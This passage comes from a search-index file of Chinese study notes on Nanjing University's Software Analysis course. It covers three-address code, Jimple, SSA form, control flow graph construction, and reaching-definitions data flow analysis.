<li>Compiler-generated temporary: t1, t2</li> </ul> <p>3AC \u5e38\u89c1\u7684\u683c\u5f0f\uff1a</p> <pre><code>x = y bop z\nx = uop y\nx = y\ngoto L\nif x goto L\nif x rop y goto L\n\n// description\nx, y, z: addresses\nbop: binary arithmetic or logical operation       // \u4e8c\u5143\u8fd0\u7b97\u7b26/\u903b\u8f91\u8fd0\u7b97\u7b26\nuop: unary operation (minus, negation, casting)   // \u4e00\u5143\u8fd0\u7b97\u7b26\nL: a label to represent a program location        // \u4ee3\u8868\u7a0b\u5e8f\u4f4d\u7f6e\u7684\u8868\u793a\u7b26\nrop: relational operator (&gt;, &lt;, ==, &gt;=, &lt;=, etc.) // \u6bd4\u8f83\u8fd0\u7b97\u7b26\ngoto L: unconditional jump                        // \u65e0\u6761\u4ef6\u8df3\u8f6c\nif \u2026 goto L: conditional jump                     // \u6709\u6761\u4ef6\u8df3\u8f6c\n</code></pre>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#3ac-in-real-static-analyzer-jimple","title":"3AC in Real Static Analyzer: Jimple","text":"<p>Soot \u662f\u76ee\u524d\u6700\u6d41\u884c\u7684 Java \u9759\u6001\u5206\u6790\u6846\u67b6\uff0cSoot \u7684 IR \u662f Jimple\uff1atyped 3-address code</p> <p>Jimple \u4e2d\u5e38\u7528\u7684\u6982\u5ff5\u89e3\u6790\uff1a</p> <ul> <li>invokespecial\uff1acall constructor, call superclass methods, call private methods</li> <li>invodevirutal\uff1acall instance methods (virtual dispatch)\uff0c\u4e5f\u5c31\u662f\u5e38\u7528\u65b9\u6cd5\u8c03\u7528\uff0c\u8c03\u7528\u5b9e\u4f8b\u7684\u65b9\u6cd5</li> <li>invokeinterface\uff1acannot optimization, checking interface implementation\uff0c\u8c03\u63a5\u53e3\u7684\u65b9\u6cd5</li> <li>invokestatic\uff1acall static methods</li> <li>invokedynamic\uff08Java 7)\uff1aJava static typing, dynamic language runs on JVM</li> <li>method signature\uff1a\u5373\u65b9\u6cd5\u7b7e\u540d\uff0c\u5176\u683c\u5f0f\u4e3a <code>calss_name: return_type method_name(parameter1_type, ...)</code></li> <li>Jimple \u4e2d\u7684 clinit \u65b9\u6cd5\uff1a\u5c06\u53d8\u91cf\u3001\u7c7b\u88c5\u5165\u5185\u5b58\u4e2d\uff0c\u5e76\u521d\u59cb\u5316</li> </ul> <pre><code>package nju.sa.examples;\npublic class Class3AC{\n    public static final double pi = 3.14;\n    public static void main(String[] args){\n\n    }\n}\n</code></pre> <p>\u6b64\u65f6\u88ab\u7ffb\u8bd1\u6210\u4e09\u5730\u5740\u7801 Jimple \u5982\u4e0b\uff1a</p> <pre><code>public class nju.sa.examples.Class3AC extend java.lang.Object{ // Object \u662f\u6240\u6709\u7c7b\u7684\u57fa\u7c7b\n    public static final double pi;\n    public void&lt;init&gt;(){...}  // \u8c03\u7528\u9ed8\u8ba4\u7684\u521d\u59cb\u5316\u65b9\u6cd5\n    public static void main(java.lang.String[]){...}\n    // \u521d\u59cb\u5316\u9759\u6001\u53d8\u91cf pi\n    public static void &lt;clinit&gt;(){\n        &lt;nju.sa.examples.Class3AC: double pi&gt; = 3.14;\n        return;\n    }\n}\n</code></pre> <p></p> <p>\u8c03\u7528$r3 \u7684 append \u65b9\u6cd5\uff0c\u5176\u4f59\u5185\u5bb9\u662f\u8be5\u65b9\u6cd5\u7684 method signature\uff08\u7b7e\u540d\uff09\uff0c\u4f9d\u6b21\u662f\uff1a</p> <ul> <li>\u8be5\u65b9\u6cd5\u6765\u81ea\u54ea\u4e2a\u7c7b</li> <li>\u8fd4\u56de\u503c\u7c7b\u578b</li> <li>\u65b9\u6cd5\u540d</li> <li>\u65b9\u6cd5\u53c2\u6570\u7684\u7c7b\u578b</li> <li>\u771f\u6b63\u8c03\u7528\u7684\u53c2\u6570\u662f r1</li> </ul> <p></p> <p>Todo\uff1a\u4f8b\u5b50\u4ee3\u7801\u540e\u7eed\u7528 soot \u751f\u6210\u540e\u8865\u5145\uff01\u53c2\u89c1PDF</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#static-single-assignmentssa","title":"Static Single Assignment\uff08SSA\uff09","text":"<p>SSA\uff0c\u5373\u9759\u6001\u5355\u8d4b\u503c\uff0c\u5176\u4e2d\u6240\u6709\u7684\u53d8\u91cf\u90fd\u6709\u72ec\u4e00\u65e0\u4e8c\u7684\u540d\u5b57\uff1a</p> <ul> <li>\u6bcf\u6b21\u5b9a\u4e49\u65f6\uff0c\u7ed9\u4e00\u4e2a\u65b0\u540d\u79f0</li> <li>\u5c06\u65b0\u7684\u540d\u79f0\u4f20\u64ad\u5230\u540e\u7eed\u7684\u4f7f\u7528\u4e2d</li> <li>\u6bcf\u4e2a\u53d8\u91cf\u90fd\u53ea\u4f1a\u5b9a\u4e49\u4e00\u6b21</li> </ul> <pre><code>## 3AC\np = a + b\nq = p - c\np = q * d\np = e - p\nq = p + q\n</code></pre> <p>\u5c06\u5176\u4fee\u6539\u4e3a SSA</p> <pre><code>## SSA\np1 = a + b\nq1 = p1 - c\np2 = q1 * d\np3 = e - p2\nq2 = p3 + q1\n</code></pre> <p>\u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u5728\u63a7\u5236\u6d41\u4e2d merge \u4e86\u600e\u4e48\u529e\uff1f</p> <pre><code>if e:\n    x0 = 0\nelse:\n    x1 = 1\ny = x + 7 ## \u6b64\u65f6\uff0c\u8fd9\u4e2a x \u5e94\u8be5\u5982\u4f55\u547d\u540d\uff1f\n</code></pre> <p>SSA \u5f15\u5165\u4e00\u4e2a\u7279\u6b8a\u7684 merge \u64cd\u4f5c\u7b26\uff1a \u03a6\uff0c\u79f0\u4e3a fhi-function\u3002</p> <p>\u4e8e\u662f\uff0c\u4e0a\u8ff0\u4ee3\u7801\u4fee\u6539\u4e3a\uff1a</p> <pre><code>...\nx2 = \u03a6(x0,x1)\ny = x2 + 7\n</code></pre> <p>SSA \u7684\u4f18\u70b9\uff1f</p> <ul> <li> <p>\u6d41\u4fe1\u606f\u88ab\u95f4\u63a5\u7684\u5408\u5e76\u5230\u4e86\u53d8\u91cf\u540d\u79f0\u4e2d\uff0c\u5728\u8fdb\u884c flow-insensitive \u5206\u6790\u65f6\uff0c\u53ef\u80fd\u53ef\u4ee5\u5f97\u5230 flow-sensitive \u5206\u6790\u7684\u7cbe\u5ea6</p> </li> <li> <p>\u5b9a\u4e49\u548c\u4f7f\u7528\u5bf9\u662f\u663e\u5f0f\u7684</p> </li> </ul> <ul> <li>\u5728\u4e00\u4e9b\u6309\u9700\u4efb\u52a1\u4e2d\u652f\u6301\u66f4\u6709\u6548\u7684\u6570\u636e\u4e8b\u5b9e\u5b58\u50a8\u548c\u4f20\u64ad</li> <li>\u4e00\u4e9b\u4f18\u5316\u4efb\u52a1\u5728 SSA \u4e0a\u6267\u884c\u5f97\u66f4\u597d(\u4f8b\u5982\uff0c\u6761\u4ef6\u5e38\u6570\u4f20\u64ad\uff0c\u5168\u5c40\u503c\u7f16\u53f7)\u3002</li> </ul> <p>SSA \u7684\u7f3a\u70b9\uff1f</p> <ul> <li>\u53ef\u80fd\u5f15\u5165\u8fc7\u591a\u7684\u53d8\u91cf\u548c phi-functions</li> <li>\u5728\u7ffb\u8bd1\u5230\u673a\u5668\u7801\u65f6\u53ef\u80fd\u5b58\u5728\u6548\u7387\u4f4e\u7684\u95ee\u9898</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#cfg-control-flow-graphs","title":"\u63a7\u5236\u6d41\u56fe\uff08CFG, Control Flow Graphs\uff09","text":"<p>CFG \u662f\u9759\u6001\u5206\u6790\u7684\u57fa\u672c\u7ed3\u6784\uff0cCFG \u4e2d\u7684\u8282\u70b9\u53ef\u4ee5\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u4e09\u5730\u5740\u7801\uff0c\u4e5f\u53ef\u4ee5\uff08\u901a\u5e38\uff09\u662f\u4e00\u4e2a\u57fa\u672c\u5757\uff08BB\uff09\u3002</p> <p>\u57fa\u672c\u5757\u662f\u6ee1\u8db3\u4e0b\u5217\u5173\u7cfb\u7684\u4e09\u5730\u5740\u7801\u7684\u6700\u5927\u5e8f\u5217\u96c6\u5408\uff1a</p> <ul> <li>It can be entered only at the beginning, i.e., the first instruction in the block\u3002\u53ea\u53ef\u4ee5\u4ece BB \u4e2d\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u8fdb\u5165\u3002</li> <li>It can be exited only at the end, i.e., the last instruction in the block\u3002\u53ea\u53ef\u4ee5\u4ece BB \u4e2d\u7684\u6700\u540e\u4e00\u6761\u6307\u4ee4\u9000\u51fa\u3002</li> </ul> <p></p> <p>How to build Basic Blocks\uff1f</p> <ul> <li> <p>\u8f93\u5165\uff1aA sequence of three-address instructions of P</p> </li> <li> <p>\u8f93\u51fa\uff1aA list of basic blocks of P</p> </li> <li> <p>\u6784\u5efa\u65b9\u6cd5</p> </li> <li> <p>\u627e\u5230 P \u4e2d\u533a\u5757\u7684 leader\uff08\u533a\u5757\u7684\u9996\u4e2a\u6307\u4ee4\uff09</p> <ul> <li>P \u4e2d\u7684\u7b2c\u4e00\u4e2a\u6307\u4ee4\u662f leader</li> <li>\u8df3\u8f6c\u6307\u4ee4\uff08conditional or unconditional jump\uff09 \u7684\u76ee\u6807\u6307\u4ee4\u4e5f\u662f leader\uff08\u82e5\u4ed6\u4e0d\u5355\u72ec\u4f5c\u4e3a leader\uff0c\u5219\u5176\u6240\u5c5e BB \u5c06\u4f1a\u6709\u4e24\u4e2a\u5165\u53e3\uff09</li> <li>\u8df3\u8f6c\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u4e5f\u662f leader\u3002\u56e0\u4e3a\u5047\u8bbe\u4f60\u5c06\u8df3\u8f6c\u6307\u4ee4\u548c\u5b83\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u653e\u5728\u540c\u4e00\u4e2a BB \u4e2d\uff0c\u6b64\u65f6\u8be5 BB \u5c31\u6709\u4e86\u4e24\u4e2a\u51fa\u53e3\u3002</li> </ul> </li> <li> <p>Build BBs for P</p> <ul> <li>\u4e00\u4e2a BB \u5305\u542b\u4e00\u4e2a leader \u548c \u4e0b\u4e00\u4e2a leader \u4e4b\u95f4\u7684\u6240\u6709\u6307\u4ee4</li> </ul> </li> </ul> <p>INPUT</p> <pre><code>(1) x = input\n(2) y = x - 1\n(3) z = x * y\n(4) if z &lt; x goto (7)\n(5) p = x / y\n(6) q = p + y\n(7) a = q\n(8) b = x + a\n(9) c = 2a - b\n(10) if p == q goto (12)\n(11) goto (3)\n(12) return\n</code></pre> <p>\uff081\uff09Determine the leaders in P</p> <ul> <li>P \u4e2d\u7684\u7b2c\u4e00\u4e2a\u6307\u4ee4\u662f leader\uff1a{1}</li> <li>\u8df3\u8f6c\u6307\u4ee4\u7684\u76ee\u6807\u6307\u4ee4\u4e5f\u662f leader\uff1a{3, 7, 12}</li> <li> <p>\u8df3\u8f6c\u6307\u4ee4\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u4e5f\u662f leader\uff1a{5, 11, 12}</p> </li> <li> <p>\u6c47\u603b leaders = {1, 3, 5, 7, 11, 12}</p> </li> </ul> <p>\uff082\uff09Build BBs for P</p> <ul> <li>B1 {(1),(2)}</li> <li>B2 {(3),(4)}</li> <li>B3 {(5),(6)}</li> <li>B4 {(7),(8),(9),(10)}</li> <li>B5 {(11)}</li> <li>B6 {(12)}</li> </ul> <p>OUTPUT</p> <p></p> <p>How to build Control Flow Graph\uff1f</p> <ul> <li>CFG \u7684\u8282\u70b9\u662f BB</li> <li>\u5f53\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u65f6\uff0c\u8fde\u63a5 block A \u548c block B\uff1a</li> <li>\u5728 block A \u7684\u7ed3\u5c3e\u5b58\u5728\u8df3\u8f6c\u6307\u4ee4\uff08conditional or unconditional jump\uff09\uff0c\u5176\u8df3\u8f6c\u76ee\u6807\u4e3a block B \u7684\u8d77\u59cb\u6307\u4ee4</li> <li>\u987a\u5e8f\u6267\u884c\u65f6\uff0cblock B \u7684\u6307\u4ee4\u5c31\u5728 block A \u540e\u9762\uff0c\u4e14 block A \u4e0d\u4ee5\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\u7ed3\u675f\u3002</li> </ul> <p></p> <p>\u901a\u5e38\u8fd8\u4f1a\u6dfb\u52a0\u4e24\u4e2a\u8282\u70b9\uff1aEntry \u548c Exit\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u65b9\u4fbf\u9759\u6001\u5206\u6790\u7b97\u6cd5\u7684\u8bbe\u8ba1\u3002</p> <ul> <li>\u4ece Entry \u5230 BB \u7684\u4e00\u6761\u8fb9\uff0c\u5305\u542b IR \u7684\u7b2c\u4e00\u6761\u6307\u4ee4</li> <li>\u4ece\u4efb\u4f55\u5305\u542b\u4e00\u6761\u6307\u4ee4\u7684 BB \u4e2d\u9000\u51fa\u7684\u8fb9\u7f18\uff0c\u8be5\u6307\u4ee4\u53ef\u80fd\u662f IR \u7684\u6700\u540e\u4e00\u6761\u6307\u4ee4</li> </ul> <p>\u6b64\u5916\uff0c\u901a\u5e38\u8fd8\u4f1a\u5c06\u8df3\u8f6c\u6307\u4ee4\u7684\u76ee\u6807\u4ece\u6307\u4ee4\u6807\u8bc6\u7b26\u4fee\u6539\u4e3a\u533a\u5757\u6807\u8bc6\u7b26\uff1a</p> <pre><code>## block A\n(j) goto (i)\n## \u4fee\u6539\u4e3a goto B\n</code></pre> <pre><code>## block B\n(i) xxx\n</code></pre>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_2","title":"\u6570\u636e\u6d41\u5206\u6790","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#overview-of-data-flow-analysis","title":"Overview of Data Flow Analysis","text":"<p>Data Flow Analysis\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1aHow Data Flows on CFG?</p> <p>\u5728\u6b64\u4e4b\u524d\uff0c\u66fe\u7528\u4e24\u4e2a\u8bcd\u603b\u7ed3\u4e86\u9759\u6001\u5206\u6790\uff1a</p> <ul> <li>Abstraction</li> <li>Over-approximation</li> <li>Transfer functions</li> <li>Control flows</li> </ul> <p>\u5176\u4e2d Abstraction \u7684\u90e8\u5206\u5c31\u662f\u5c06 Data \u8fdb\u884c\u62bd\u8c61\uff0c\u4f8b\u5982\u5c06\u6570\u5b57\u7c7b\u578b\u62bd\u8c61\u4e3a <code>+ - 0 T \u22a5</code></p> <p>\u5bf9\u4e8e\u7edd\u5927\u591a\u6570\u7684\u9759\u6001\u5206\u6790\uff0c\u90fd\u91c7\u7528 Over-approximation\uff0c\u4f46\u662f\u4ecd\u6709\u5c11\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u91c7\u7528 under-approximation\u3002\u4e8c\u8005\u90fd\u662f\u4e3a\u4e86\u5206\u6790\u7684\u5b89\u5168\u6027\uff0c\u56e0\u6b64\u7edf\u79f0\u4e3a Safe-approximation\uff0c\u5e94\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\u4f7f\u7528 Over or Under\u3002</p> <ul> <li> <p>may analysis: \u8f93\u51fa\u7684\u7ed3\u679c may be true\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u8bef\u62a5\uff0c\u4e0d\u8bb8\u6f0f\u62a5\uff08over-approximation\uff09\u3002\u5e76\u96c6 <code>\u222a</code></p> </li> <li> <p>must analysis: \u8f93\u51fa\u7684\u7ed3\u679c must be true\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u6f0f\u62a5\uff0c\u4e0d\u8bb8\u8bef\u62a5\uff08under-approximation\uff09 \u3002\u4ea4\u96c6 <code>\u2229</code></p> </li> </ul> <p>Transfer function \u7528\u4e8e\u5c06 BB \u4e2d\u7684\u5185\u5bb9\u8f6c\u5316\u4e3a\u62bd\u8c61\u7684\u6570\u636e\uff0c\u4f8b\u5982\u6b63\u6b63\u5f97\u8d1f <code>+ op + = +</code></p> <p>Control flows \u662f\u62bd\u8c61\u6570\u636e\u7684\u6d41\u52a8\uff0c\u4ee5\u53ca\u5728\u4e24\u6761\u6d41\u6c47\u805a\u7684\u65f6\u5019\u5982\u4f55\u505a\u5904\u7406\uff1f\u505a\u4ea4\u96c6\u6216\u5e76\u96c6\u5904\u7406\u3002</p> <p>\u4e0d\u540c\u7684 \u6570\u636e\u6d41\u5206\u6790\u5e94\u7528 \u5177\u6709\uff1a\u2460 \u4e0d\u540c\u7684 data abstraction \u2461 \u4e0d\u540c\u7684 Safe-approximation \u7b56\u7565\uff08under/Over\uff09 \u2462 \u4e0d\u540c\u7684 transfer function \u2463 \u4e0d\u540c\u7684 control flows</p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#preliminaries-of-data-flow-analysis","title":"Preliminaries of Data Flow Analysis","text":"<p>\u8bb2\u8ff0\u6570\u636e\u6d41\u5206\u6790\u7684\u524d\u7f6e\u77e5\u8bc6\u3002</p> <p>\u6bcf\u6b21 IR statement \u7684\u6267\u884c\uff0c\u90fd\u4f1a\u5c06\u8f93\u5165\u72b6\u6001\u8f6c\u6362\u4e3a\u65b0\u7684\u8f93\u51fa\u72b6\u6001\u3002\u8f93\u5165\u548c\u8f93\u51fa\u72b6\u6001\u4e0e IR statement \u524d\u540e\u7684 program point \u76f8\u5173\u8054\u3002</p> <p>\u7a0b\u5e8f\u6d41\u7684\u6267\u884c\u6709\u5982\u4e0b\u4e09\u79cd\u65b9\u5f0f\uff1a</p> <p></p> <p>\u5c06 BB \u6216\u8005 IR statement \u7684\u8f93\u5165\u79f0\u4e3a <code>IN[...]</code> \uff0c\u8f93\u51fa\u79f0\u4e3a <code>OUT[...]</code></p> <p>\u5728\u7b2c\u4e09\u79cd\u60c5\u51b5\u4e2d\uff0c\u6839\u636e <code>may analysis</code>\u548c<code>must analysis</code>\u7684\u4e0d\u540c\uff0cmeet operator \u5206\u522b\u4e3a <code>\u222a</code>\u548c<code>\u2229</code>\u3002\u5982\u679c\u662f<code>may analysis</code>\u5c31\u5fc5\u987b\u4fdd\u8bc1\u4e0d\u6f0f\u62a5\uff0c\u56e0\u6b64\u53d6\u5e76\u96c6<code>\u222a</code>\uff1b\u800c<code>must analysis</code>\u5fc5\u987b\u4fdd\u8bc1\u4e0d\u8bef\u62a5\uff0c\u56e0\u6b64\u53d6\u4ea4\u96c6<code>\u2229</code>\u3002</p> <p></p> <p>\u5728\u6bcf\u4e2a\u6570\u636e\u6d41\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u5c06\u6bcf\u4e2a program point \u4e0e\u4e00\u4e2a data-flow value \u76f8\u5173\u8054\uff0c\u8be5\u503c\u8868\u793a\u5bf9\u8be5\u70b9\u53ef\u89c2\u5bdf\u5230\u7684\u6240\u6709\u53ef\u80fd\u7684 program states set \u7684 Abstraction\u3002</p> <p>\u6240\u6709\u53ef\u80fd\u7684 data-flow value \u7684\u96c6\u5408\u79f0\u4e3a Domain\u3002</p> <p>Data-flow analysis is to find a solution to a set of safe-approximationdirected constraints on the IN[s]\u2019s and OUT[s]\u2019s, for all statements s.</p> <ul> <li>constraints based on semantics of statements (transfer functions)</li> <li>constraints based on the flows of control</li> </ul> <p>\u6570\u636e\u6d41\u5206\u6790\u5206\u4e3a Forward Analysis \u548c Backward Analysis\uff0c\u5176\u7b26\u53f7\u8868\u793a\u5982\u4e0b\uff1a</p> <p></p> <p>\u6ce8\uff1a\u6709\u4e9b\u4eba\u5728\u8fdb\u884c Backward Analysis \u65f6\uff0c\u5c06 CFG \u53cd\u5411\u5efa\u7acb\uff0c\u7136\u540e\u518d\u5bf9\u53cd\u5411 CFG \u8fdb\u884c Forward Analysis\uff0c\u4ee5\u8fbe\u5230 Backward Analysis \u7684\u6548\u679c\u3002</p> <p>\u4ee5 Forward Analysis \u4e3a\u4f8b\uff0cf<sub>s</sub> \u7684\u8f93\u5165\u662f IR statement \u3002<code>s</code> \u7684\u8f93\u5165 IN[s]\uff0c\u8f93\u51fa\u662f OUT[s]\u3002</p> <p>\u53ef\u4ee5\u7406\u89e3\u4e3a\uff0c\u5728<code>s</code>\u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u5176\u8f93\u51fa\u4e3a OUT[s]\u3002\u81f3\u4e8e\u4ec0\u4e48\u662f OUT[s]\uff0c\u4e0b\u6587\u8be6\u89e3\u3002</p> <p>\u4e0a\u8ff0\u7684\u4f8b\u5b50\u90fd\u662f\u4ee5 IR statement \u4e3a\u4f8b\uff0c\u5728\u5b9e\u9645\u5206\u6790\u4e2d\uff0cIR \u5f80\u5f80\u662f\u6307 CFG\uff0c\u56e0\u6b64\u6570\u636e\u6d41\u5206\u6790\u7684 Node \u5e94\u8be5\u662f BB\uff0c\u5176\u7b26\u53f7\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <p></p> <p>meet operator <code>\u2227</code> \u7528\u4e8e\u6c47\u603b\u4e0d\u540c\u8def\u5f84\u7684\u7ed3\u679c\uff0c\u5f80\u5f80\u662f\u505a\u4ea4\u96c6<code>\u2229</code>\u6216\u5e76\u96c6 <code>\u222a</code>\u5904\u7406\u3002</p> <p>\u5728\u4e0a\u8ff0\u7684\u7406\u8bba\u57fa\u7840\u4e0b\uff0c\u5bf9\u4e09\u79cd Data Flow Analysis Applications \u8fdb\u884c\u4ecb\u7ecd\uff0c\u4f46\u4e0d\u6d89\u53ca\u5982\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>Method Calls\uff0c\u65b9\u6cd5\u8c03\u7528\uff0c\u8fc7\u4e8e\u590d\u6742\uff0c\u5728 Inter-procedural Analysis \u4e2d\u8bb2\u89e3</li> <li>Aliases\uff0c\u8bb2\u8ff0\u7684\u4f8b\u5b50\u90fd\u6ca1\u6709 Aliases\uff0c\u5c06\u5728 Pointer Analysis \u4e2d\u8bb2\u89e3</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#applications","title":"Applications","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#reaching-definitions-analysis","title":"Reaching Definitions Analysis","text":"<p>Definitions</p> <p>A definition d at program point p reaches a point q if there is a path from p to q such that d is not \u201ckilled\u201d along that path</p> <p>\u5728 program point p \u5b58\u5728\u4e00\u4e2a definition d\uff0c\u4f8b\u5982 <code>v = 1</code>\uff0c\u5982\u679c\u5728 p-&gt; q \u7684\u8fd9\u6761\u8def\u5f84\u4e0a\u4e0d\u5b58\u5728\u53d8\u91cf v \u7684\u65b0\u7684\u8d4b\u503c\u5b9a\u4e49\uff0c\u90a3\u5c31\u8bf4\u660e\u8fd9\u4e2a definiteion d \u6ca1\u6709\u88ab\u6740\u6b7b\uff0c\u662f\u53ef\u4ee5\u5230\u8fbe\u7684\u3002</p> <p></p> <p>Usage</p> <p>\u5230\u8fbe\u5b9a\u4e49\u5206\u6790\u53ef\u4ee5\u7528\u4e8e\u68c0\u6d4b\u6f5c\u5728\u7684 undefined variables\u3002</p> <p>\u4f8b\u5982\uff0c\u5728 CFG \u7684 Entry \u8282\u70b9\u5f15\u5165\u6240\u6709\u53d8\u91cf\u7684\u865a\u62df\u5b9a\u4e49\uff08dummy definition\uff09\uff0c\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u865a\u62df\u5b9a\u4e49 v \u5230\u8fbe\u4e86\u4e00\u4e2a program point p\uff0c\u6839\u636e\u5230\u8fbe\u5206\u6790\u7684\u5b9a\u4e49\uff0c\u8bf4\u660e Entry \u548c p \u4e4b\u95f4\uff0c\u6ca1\u6709\u91cd\u65b0\u8d4b\u503c\u5b9a\u4e49\u53d8\u91cf v\uff0c\u5982\u679c p \u4f7f\u7528\u4e86\u53d8\u91cf v\uff0c\u8bf4\u660e\u4ed6\u4f7f\u7528\u7684\u662f\u672a\u5b9a\u4e49\u7684\u53d8\u91cf v\u3002</p> <p>Abstraction</p> <p>Data Flow Values/Facts\uff1a</p> <ul> <li>The definitions of all the variables in a program</li> <li>Can be represented by bit vectors\uff08\u5e38\u7528\u7684\u8868\u8fbe\u5f62\u5f0f\uff09</li> <li>e.g., D1, D2, D3, D4, \u2026, D8 (8 definitions)</li> <li>\u4f7f\u7528\u6bd4\u7279\u8868\u793a\uff1a00000000\uff0c0 \u8868\u793a\u4e0d\u53ef\u8fbe\uff0c1 \u8868\u793a\u53ef\u5230\u8fbe</li> </ul> <p>Safe-approximation</p> <ul> <li>Transfer Function\uff1aOUT[B] = gen<sub>B</sub> U (IN[B] - kill<sub>B</sub>)</li> <li>gen<sub>B</sub>\u662f BB \u4e2d\u7684\u6240\u6709\u5b9a\u4e49\u8bed\u53e5 D</li> <li>IN[B]\u987e\u540d\u601d\u4e49\uff0c\u7b49\u4e8e\u4e0a\u4e00\u4e2a BB \u7684 OUT</li> <li>kill<sub>B</sub>\u662f\u6307\uff0c\u5982\u679c\u5f53\u524d BB \u4e2d\u91cd\u65b0\u5b9a\u4e49\u4e86\u53d8\u91cf v\uff0c\u90a3\u4e48\u5c31\u8981\u5220\u9664\u6240\u6709\u5176\u4ed6\u5bf9\u4e8e\u53d8\u91cf v \u7684\u5b9a\u4e49\u3002\u5220\u9664\u662f\u6307\uff0c\u5c06\u5bf9\u5e94\u5b9a\u4e49 D<sub>i</sub>\u7684\u6bd4\u7279\u7f6e\u4e3a 0</li> <li>Control Flow\uff1aIN[B] = U<sub>P a predecessor of B</sub> OUT[P]</li> <li>\u8be5\u7b97\u6cd5\u91c7\u7528 may analysis\uff0c\u56e0\u6b64\u5982\u679c\u9047\u5230\u5206\u652f\u6c47\u5408\u7684\u60c5\u51b5\uff0c\u53d6\u6240\u6709\u5206\u652f\u7684\u5e76\u96c6<code>\u222a</code>\u3002</li> <li>\u8be5\u7b97\u6cd5\u91c7\u7528 forwards direction</li> </ul> <p>Algorithm</p> <p>INPUT: CFG (kill<sub>B</sub> and gen<sub>B</sub> computed for each basic block B)</p> <p>OUTPUT: IN[B] and OUT[B] for each basic block B</p> <p>\u7b97\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>OUT[entry] = \u2205;\nfor (each basic block B\\entry){\n  OUT[B] = \u2205;\n}\nwhile (changes to any OUT occur){            // \u5f53 OUT \u53d1\u751f\u6539\u53d8\u65f6\uff0c\u7ee7\u7eed\u5faa\u73af\n  for (each basic block B\\entry) {           // \u904d\u5386\u6240\u6709\u8282\u70b9\n    IN[B] = UP a predecessor of B OUT[P];    // \u5373 Control Flow\uff0c\u6240\u6709\u4e0a\u6d41\u5206\u652f\u7684\u5e76\u96c6\u4f5c\u4e3a\u8be5BB\u7684\u8f93\u5165\n    OUT[B] = genB U (IN[B] - killB);         // \u5373 Transfer Function\n    }\n}\n</code></pre> <p><code>B\\entry</code>\u662f\u6307\u6392\u9664 Entry \u8fd9\u4e2a\u8282\u70b9\uff0c\u5728\u4e0a\u8ff0\u7b97\u6cd5\u4e2d\uff0c\u5176\u5b9e\u6ca1\u6709\u5fc5\u8981\u5206\u5f00\uff0c\u56e0\u4e3a\u90fd\u662f\u521d\u59cb\u5316\u4e3a<code>\u2205</code>\uff0c\u4f46\u662f\u5982\u679c\u7b97\u6cd5\u91c7\u7528 <code>must analysis</code>\u65f6\uff0cfor \u5faa\u73af\u5185\u4e0d\u662f\u521d\u59cb\u5316\u4e3a\u7a7a\uff0c\u540e\u7eed\u4f1a\u8c08\u5230\u3002\u4f46\u7531\u4e8e\u8fd9\u4e2a\u7b97\u6cd5\u662f\u4e00\u4e2a\u7ecf\u5178\u7684\u6a21\u677f\uff0c\u56e0\u6b64\u8bbe\u8ba1\u7684\u65f6\u5019\u5c3d\u53ef\u80fd\u901a\u7528\u3002</p> <p>\u8be5\u5faa\u73af\u4e3a\u4ec0\u4e48\u4f1a\u7ec8\u6b62\uff1f</p> <ul> <li>gen<sub>B</sub>\u548c kill<sub>B</sub>\u56fa\u5b9a\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316</li> <li>\u552f\u4e00\u53d1\u751f\u53d8\u5316\u7684\u662f OUT\uff0c\u4f46\u662f 